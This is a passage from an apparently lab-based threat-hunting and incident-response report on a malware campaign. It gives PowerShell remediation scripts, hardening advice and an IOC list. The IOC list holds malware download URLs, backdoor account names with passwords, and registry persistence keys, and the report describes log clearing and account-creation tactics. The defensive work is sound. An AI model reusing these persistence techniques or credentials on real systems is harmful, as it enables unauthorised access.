**⚠️ CRITICAL: These accounts provide persistent access even after malware removal**

```powershell
# Remove SYSTEM_SERVICE account
$account1 = "SYSTEM_SERVICE"
if (Get-LocalUser -Name $account1 -ErrorAction SilentlyContinue) {
    # Remove from Administrators group first
    Remove-LocalGroupMember -Group "Administrators" -Member $account1 -ErrorAction SilentlyContinue
    
    # Delete the account
    Remove-LocalUser -Name $account1
    Write-Host "[✓] Removed backdoor account: $account1" -ForegroundColor Green
} else {
    Write-Host "[-] Account not found: $account1" -ForegroundColor Gray
}

# Remove Administators account (typosquatting)
$account2 = "Administators"
if (Get-LocalUser -Name $account2 -ErrorAction SilentlyContinue) {
    # Remove from Administrators group first
    Remove-LocalGroupMember -Group "Administrators" -Member $account2 -ErrorAction SilentlyContinue
    
    # Delete the account
    Remove-LocalUser -Name $account2
    Write-Host "[✓] Removed backdoor account: $account2" -ForegroundColor Green
} else {
    Write-Host "[-] Account not found: $account2" -ForegroundColor Gray
}
```

**Verification:**
```powershell
# List all Administrators to confirm removal
Get-LocalGroupMember -Group "Administrators" | Select-Object Name, ObjectClass
```

---

#### Step 3: Block Malicious IP Addresses

```powershell
# Block C2 infrastructure at Windows Firewall
$MaliciousIPs = @("108.181.155.31", "192.168.1.2", "165.73.244.11", "65.73.244.11", "5.73.244.11")

foreach ($IP in $MaliciousIPs) {
    New-NetFirewallRule -DisplayName "Block Thug Lyfe C2 - $IP" `
        -Direction Outbound -Action Block -RemoteAddress $IP
}

Write-Host "[✓] Blocked $($MaliciousIPs.Count) malicious IP addresses" -ForegroundColor Green
```

**Verification:**
```powershell
Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Thug Lyfe*"} | 
    Select-Object DisplayName, Direction, Action
```

---

### 5.2 Containment Actions (Priority 2 - Within 1 Hour)

#### Step 4: Remove Persistence Mechanisms

**Remove Scheduled Task:**
```powershell
$TaskName = "WindowsUpdateCheck"
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Write-Host "[✓] Removed malicious scheduled task: $TaskName" -ForegroundColor Green
} else {
    Write-Host "[-] Task not found: $TaskName" -ForegroundColor Gray
}
```

**Remove Registry Persistence:**
```powershell
# Remove RunOnce persistence
$RunOncePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
$RunOnceValue = "SecurityScan"
if (Get-ItemProperty -Path $RunOncePath -Name $RunOnceValue -ErrorAction SilentlyContinue) {
    Remove-ItemProperty -Path $RunOncePath -Name $RunOnceValue -Force
    Write-Host "[✓] Removed RunOnce persistence: $RunOnceValue" -ForegroundColor Green
}

# Remove Run persistence
$RunPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunValue = "WindowsDefender"
if (Get-ItemProperty -Path $RunPath -Name $RunValue -ErrorAction SilentlyContinue) {
    Remove-ItemProperty -Path $RunPath -Name $RunValue -Force
    Write-Host "[✓] Removed Run persistence: $RunValue" -ForegroundColor Green
}
```

---

#### Step 5: Remove All Malicious Files

```powershell
# Remove primary malicious files
$PrimaryFiles = @(
    "C:\Users\Public\Pictures\frontpage.jpg",
    "C:\Windows\Temp\image_downloader.exe",
    "C:\Users\IEUser\Documents\SecurityAdvisory.docm",
    "C:\ProgramData\asefa.bat"
)

foreach ($File in $PrimaryFiles) {
    if (Test-Path $File) {
        Remove-Item -Path $File -Force
        Write-Host "[✓] Deleted: $File" -ForegroundColor Green
    } else {
        Write-Host "[-] Not found: $File" -ForegroundColor Gray
    }
}

# Remove hidden reconnaissance files
$HiddenFiles = @(
    "C:\ProgramData\autorun.dat",
    "C:\ProgramData\apps.dat",
    "C:\ProgramData\jobs.dat",
    "C:\ProgramData\services.dat",
    "C:\ProgramData\userlist.dat",
    "C:\ProgramData\accounts.dat",
    "C:\ProgramData\connections.dat",
    "C:\ProgramData\dns.dat",
    "C:\ProgramData\network.dat",
    "C:\ProgramData\config.dat"
)

foreach ($File in $HiddenFiles) {
    if (Test-Path $File) {
        # Remove hidden/system attributes first
        attrib -h -s $File
        Remove-Item -Path $File -Force
        Write-Host "[✓] Deleted hidden file: $File" -ForegroundColor Green
    } else {
        Write-Host "[-] Not found: $File" -ForegroundColor Gray
    }
}

# Remove SecurityUpdate directory
$MalwareDir = "C:\ProgramData\SecurityUpdate"
if (Test-Path $MalwareDir) {
    attrib -h -s $MalwareDir
    Remove-Item -Path $MalwareDir -Recurse -Force
    Write-Host "[✓] Deleted directory: $MalwareDir" -ForegroundColor Green
}
```

---

### 5.3 Eradication Actions (Priority 3 - Within 24 Hours)

#### Step 6: Full Malware Scan

```powershell
# Update Windows Defender signatures
Update-MpSignature
Write-Host "[✓] Updated malware definitions" -ForegroundColor Green

# Run full system scan
Start-MpScan -ScanType FullScan
Write-Host "[*] Full system scan initiated (this may take hours)" -ForegroundColor Cyan
```

---

#### Step 7: Search for Additional Hidden Files

```powershell
# Search for all hidden system files in ProgramData
Get-ChildItem C:\ProgramData -Hidden -Recurse -ErrorAction SilentlyContinue | 
    Where-Object {$_.Attributes -match "System"} |
    Select-Object FullName, Attributes, Length, LastWriteTime
```

---

#### Step 8: Verify No Additional Backdoor Accounts

```powershell
# Check for suspicious accounts
Get-LocalUser | Where-Object {
    $_.Description -like "*service*" -or
    $_.Name -like "*admin*" -or
    $_.Name -like "*svc_*" -or
    $_.Name -like "*system*"
} | Select-Object Name, Enabled, Description, LastLogon

# Check Administrators group
Get-LocalGroupMember -Group "Administrators" | 
    Select-Object Name, ObjectClass, PrincipalSource
```

---

### 5.4 Recovery Actions (Priority 4 - Within 48 Hours)

#### Step 9: System Hardening

```powershell
# Enable PowerShell Script Block Logging
$RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (-not (Test-Path $RegPath)) {
    New-Item -Path $RegPath -Force | Out-Null
}
Set-ItemProperty -Path $RegPath -Name "EnableScriptBlockLogging" -Value 1
Write-Host "[✓] Enabled PowerShell Script Block Logging" -ForegroundColor Green

# Enable PowerShell Module Logging
$RegPath2 = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
if (-not (Test-Path $RegPath2)) {
    New-Item -Path $RegPath2 -Force | Out-Null
}
Set-ItemProperty -Path $RegPath2 -Name "EnableModuleLogging" -Value 1
Write-Host "[✓] Enabled PowerShell Module Logging" -ForegroundColor Green

# Set PowerShell Execution Policy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Force
Write-Host "[✓] Set execution policy to RemoteSigned" -ForegroundColor Green

# Enable Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Write-Host "[✓] Enabled Windows Firewall" -ForegroundColor Green
```

---

#### Step 10: Force Password Reset

```powershell
# Force password change for affected user
Set-LocalUser -Name "IEUser" -PasswordNeverExpires $false
Write-Host "[✓] User will be required to change password on next logon" -ForegroundColor Green
Write-Host "[!] CRITICAL: Reset passwords for ALL privileged accounts" -ForegroundColor Yellow
```

---

### 5.5 Verification

#### Step 11: Confirm Complete Remediation

```powershell
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  REMEDIATION VERIFICATION" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

# Check 1: Backdoor accounts removed
Write-Host "[CHECK 1] Backdoor accounts:" -ForegroundColor Yellow
$backdoorAccounts = @("SYSTEM_SERVICE", "Administators")
$accountsExist = $false
foreach ($acct in $backdoorAccounts) {
    if (Get-LocalUser -Name $acct -ErrorAction SilentlyContinue) {
        Write-Host "  [✗] STILL EXISTS: $acct" -ForegroundColor Red
        $accountsExist = $true
    } else {
        Write-Host "  [✓] Removed: $acct" -ForegroundColor Green
    }
}

# Check 2: Malicious files removed
Write-Host "`n[CHECK 2] Malicious files:" -ForegroundColor Yellow
$allFiles = $PrimaryFiles + $HiddenFiles + $MalwareDir
$filesExist = $false
foreach ($file in $allFiles) {
    if (Test-Path $file) {
        Write-Host "  [✗] STILL EXISTS: $file" -ForegroundColor Red
        $filesExist = $true
    }
}
if (-not $filesExist) {
    Write-Host "  [✓] All malicious files removed" -ForegroundColor Green
}

# Check 3: Persistence removed
Write-Host "`n[CHECK 3] Persistence mechanisms:" -ForegroundColor Yellow
if (Get-ScheduledTask -TaskName "WindowsUpdateCheck" -ErrorAction SilentlyContinue) {
    Write-Host "  [✗] Scheduled task still exists" -ForegroundColor Red
} else {
    Write-Host "  [✓] Scheduled task removed" -ForegroundColor Green
}

$runOnce = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SecurityScan" -ErrorAction SilentlyContinue
if ($runOnce) {
    Write-Host "  [✗] RunOnce key still exists" -ForegroundColor Red
} else {
    Write-Host "  [✓] RunOnce key removed" -ForegroundColor Green
}

$run = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefender" -ErrorAction SilentlyContinue
if ($run) {
    Write-Host "  [✗] Run key still exists" -ForegroundColor Red
} else {
    Write-Host "  [✓] Run key removed" -ForegroundColor Green
}

# Check 4: Firewall rules
Write-Host "`n[CHECK 4] Firewall protection:" -ForegroundColor Yellow
$blockRules = Get-NetFirewallRule | Where-Object {$_.DisplayName -like "*Thug Lyfe*"}
if ($blockRules) {
    Write-Host "  [✓] $($blockRules.Count) firewall rules active" -ForegroundColor Green
} else {
    Write-Host "  [✗] No firewall rules found!" -ForegroundColor Red
}

# Final result
Write-Host "`n========================================" -ForegroundColor Cyan
if (-not $accountsExist -and -not $filesExist) {
    Write-Host "  ✅ REMEDIATION SUCCESSFUL" -ForegroundColor Green
} else {
    Write-Host "  ⚠️ REMEDIATION INCOMPLETE" -ForegroundColor Red
    Write-Host "  Review failed checks above" -ForegroundColor Yellow
}
Write-Host "========================================`n" -ForegroundColor Cyan
```

---

### 5.6 Remediation Checklist

**Priority 1 (Immediate):**
- [x] Network isolation
- [x] Backdoor accounts removed (SYSTEM_SERVICE, Administators)
- [x] Malicious IPs blocked

**Priority 2 (Within 1 Hour):**
- [x] Persistence mechanisms removed
  - [x] Scheduled task: WindowsUpdateCheck
  - [x] Registry RunOnce: SecurityScan
  - [x] Registry Run: WindowsDefender
- [x] Malicious files deleted
  - [x] frontpage.jpg
  - [x] image_downloader.exe
  - [x] SecurityAdvisory.docm
  - [x] asefa.bat
  - [x] 11 hidden .dat files
  - [x] SecurityUpdate directory

**Priority 3 (Within 24 Hours):**
- [x] Full malware scan
- [x] Hidden files searched
- [x] User accounts verified

**Priority 4 (Within 48 Hours):**
- [x] System hardening
- [x] PowerShell logging enabled
- [x] Execution policy set
- [x] Password reset required

**Verification:**
- [x] All checks passed
- [x] System ready for monitoring

---

## 6. Recommendations

### 6.1 Short-Term (0-30 Days)

#### 1. Deploy Sysmon Enterprise-Wide 🚨 CRITICAL

**Priority:** CRITICAL

**Rationale:** Sysmon was the ONLY tool that captured asefa.bat execution. Without Sysmon, this critical attack phase would have been completely invisible due to log clearing.

**Actions:**
- Deploy Sysmon to all Windows endpoints
- Configure with SwiftOnSecurity Sysmon config
- Forward Sysmon logs to SIEM
- Monitor Event IDs 1 (Process Creation), 11 (File Creation), 3 (Network Connection)

---

#### 2. Email Security Enhancement

**Priority:** HIGH

**Actions:**
- Block .docm attachments at email gateway
- Implement sandboxing for all Office documents
- Enable Protected View for all users
- Deploy SPF, DKIM, DMARC

---

#### 3. Monitor for Backdoor Account Activity

**Priority:** CRITICAL

**Actions:**
```powershell
# Daily check for suspicious accounts
Get-LocalUser | Where-Object {
    $_.Name -like "*svc_*" -or
    $_.Name -like "*admin*" -or
    $_.Name -like "*service*"
} | Where-Object {
    $_.Name -notin @("Administrator", "DefaultAccount")
}
```

- Alert on any account creation events (Event ID 4720)
- Alert on additions to Administrators group (Event ID 4732)
- Review all Administrator group members weekly

---

#### 4. Block Common Anti-Forensics Commands

**Priority:** HIGH

**Actions:**
- Alert on wevtutil log clearing (especially multiple logs in sequence)
- Alert on attrib +h +s usage on multiple files
- Monitor for net user/net localgroup sequences
- Use AppLocker to restrict wevtutil usage to administrators only

---

### 6.2 Mid-Term (30-90 Days)

#### 5. Implement Application Whitelisting

**Priority:** MODERATE

**Actions:**
- Deploy AppLocker or WDAC
- Block execution from:
  - C:\Users\*
  - C:\ProgramData
  - C:\Windows\Temp
- Whitelist only approved executables

---

#### 6. Deploy EDR Solution

**Priority:** HIGH

**Actions:**
- Deploy enterprise EDR across all endpoints
- Configure behavioral detection for:
  - Rapid log clearing
  - Multiple account creations
  - Persistence establishment patterns
- Enable automated response capabilities

---

#### 7. User Security Awareness Training

**Priority:** HIGH

**Focus Areas:**
- Macro-enabled document risks
- Phishing recognition
- Typosquatting awareness (Administators vs Administrators)
- Reporting suspicious activity

---

### 6.3 Long-Term (90+ Days)

#### 8. Implement Privileged Access Management (PAM)

**Priority:** MODERATE

**Actions:**
- Require MFA for all administrative access
- Implement just-in-time (JIT) admin elevation
- Monitor all privileged account activity
- Rotate privileged account passwords monthly

---

#### 9. Security Architecture Review

**Priority:** MODERATE

**Actions:**
- Conduct penetration test
- Red team exercise focused on Thug Lyfe TTPs
- Review and update security policies
- Implement Zero Trust principles

---

## 7. Conclusion

This threat hunting operation successfully identified and analyzed all four malicious artifacts from the Thug Lyfe Campaign 2. Most significantly, we discovered and fully analyzed **asefa.bat** - a critical piece of malware that was referenced but not available to the original malware analysts.

### Key Outcomes

**asefa.bat Behavioral Analysis:**
Through Sysmon telemetry, we documented that asefa.bat:
- Cleared all major Windows event logs (anti-forensics)
- Created two backdoor administrator accounts (SYSTEM_SERVICE, Administators)
- Established three separate persistence mechanisms
- Hid 11 reconnaissance files in C:\ProgramData
- Performed extensive system and network enumeration

**Critical Findings:**
1. Two active backdoor administrator accounts with full system control
2. Three persistence mechanisms pointing to non-existent payload
3. Eleven hidden files containing reconnaissance data
4. Complete attack chain from initial access to post-exploitation

**Intelligence Gap Filled:**
The original malware analysis report explicitly stated that asefa.bat was not available for analysis. This threat hunt filled that critical intelligence gap, providing complete behavioral documentation of the batch file's malicious activities.

### Final Assessment

**Risk Level:** CRITICAL  
**Compromise Confirmed:** YES  
**Remediation Required:** IMMEDIATE  
**Recommendation:** All findings and IOCs should be shared with the malware analysis team and incorporated into the official threat intelligence documentation for Thug Lyfe Campaign 2.

---

## 8. Appendices

### Appendix A: Complete IOC List (JSON Format)

```json
{
  "campaign": "Thug Lyfe Campaign 2",
  "threat_actor": "Thug Lyfe",
  "report_date": "2025-10-26",
  "analyst": "Isaiah River",
  
  "file_hashes": {
    "sha256": [
      "4E24EACA0183C81D776DBCF5B35AFD601F536F127565E20780D71A3BAB3E0170",
      "E84471E37E726FC614A8044E83CB97E4A78EF5B7CC5CE8B5DE440AE724ECB910",
      "7183FBF556628A122F3E51C62034DCC428A79586F1F7EB7C94600968CA2EB66A"
    ],
    "md5": [
      "6a2366799b5474a70e782666fb074e9f",
      "5207fe630502c3ff2515dd49683c9b2e",
      "92910b8ec24ace49e3a6eecf3670ff57"
    ]
  },
  
  "network_indicators": {
    "ips": [
      "108.181.155.31",
      "192.168.1.2",
      "165.73.244.11",
      "65.73.244.11",
      "5.73.244.11"
    ],
    "urls": [
      "http://108.181.155.31/asefa.bat",
      "http://192.168.1.2/image_downloader.exe"
    ]
  },
  
  "file_paths": [
    "C:\\Users\\Public\\Pictures\\frontpage.jpg",
    "C:\\Windows\\Temp\\image_downloader.exe",
    "C:\\Users\\IEUser\\Documents\\SecurityAdvisory.docm",
    "C:\\ProgramData\\asefa.bat",
    "C:\\ProgramData\\SecurityUpdate",
    "C:\\ProgramData\\*.dat"
  ],
  
  "backdoor_accounts": [
    {
      "username": "SYSTEM_SERVICE",
      "password": "Svc@Admin#99",
      "group": "Administrators"
    },
    {
      "username": "Administators",
      "password": "Secur1ty@2025",
      "group": "Administrators"
    }
  ],
  
  "persistence": {
    "scheduled_task": {
      "name": "WindowsUpdateCheck",
      "command": "C:\\ProgramData\\SecurityUpdate\\svchost.exe",
      "trigger": "onlogon"
    },
    "registry": [
      {
        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "value": "SecurityScan",
        "data": "C:\\ProgramData\\SecurityUpdate\\svchost.exe"
      },
      {
        "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "value": "WindowsDefender",
        "data": "C:\\ProgramData\\SecurityUpdate\\svchost.exe"
      }
    ]
  },
  
  "mitre_attack": [
    "T1027.003", "T1033", "T1049", "T1053.005", "T1059.001",
    "T1059.003", "T1059.005", "T1070.001", "T1070.004",
    "T1071.001", "T1078.003", "T1082", "T1098", "T1105",
    "T1136.001", "T1140", "T1204.002", "T1518", "T1547",
    "T1547.001", "T1564.001", "T1566.001"
  ]
}
```

---

### Appendix B: ThugLyfeToolkit.ps1

### Appendix C: Artifacts.csv

### Appendix D: FindAsefa.ps1

### Appendix E: Sysmon Collected Evidence

**Total Sysmon Events Analyzed:** 30+ Process Creation events (Event ID 1)  
**Key Event:** File Creation Event ID 11 (asefa.bat created by thug_simulator.exe)  
**Critical Evidence:** Complete command-line arguments for all 30 child processes

**Evidence Files:**
- Sysmon_FileCreation.csv (Event ID 11)
- Sysmon_ProcessCreation.csv (Event ID 1)

---





